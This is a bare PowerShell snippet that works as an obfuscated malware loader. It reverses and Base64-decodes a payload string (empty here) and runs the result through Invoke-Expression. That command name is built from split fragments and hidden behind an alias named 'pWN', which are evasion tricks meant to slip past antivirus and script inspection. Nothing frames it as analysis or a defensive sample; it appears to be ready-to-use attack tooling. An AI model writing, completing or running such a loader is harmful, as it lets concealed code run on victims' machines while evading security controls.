$m5jz = "" ;
$7 = $m5jz.ToCharArray() ; [array]::Reverse($7) ; -join $7 2>&1> $null ;
$g3JrBfL = [sYStem.TEXt.EnCoDing]::Utf8.getstRinG([SYSTEM.cONveRt]::frOMBAsE64sTRINg("$7")) ;
$l85WO0BzRMYVNvEu = "In"+"vo"+"KE"+"-E"+"XP"+"Re"+"sS"+"iO"+"n" ; New-alias -NAMe pWN -ValUE $l85WO0BzRMYVNvEu -force ; PWN $g3JrBfL ;

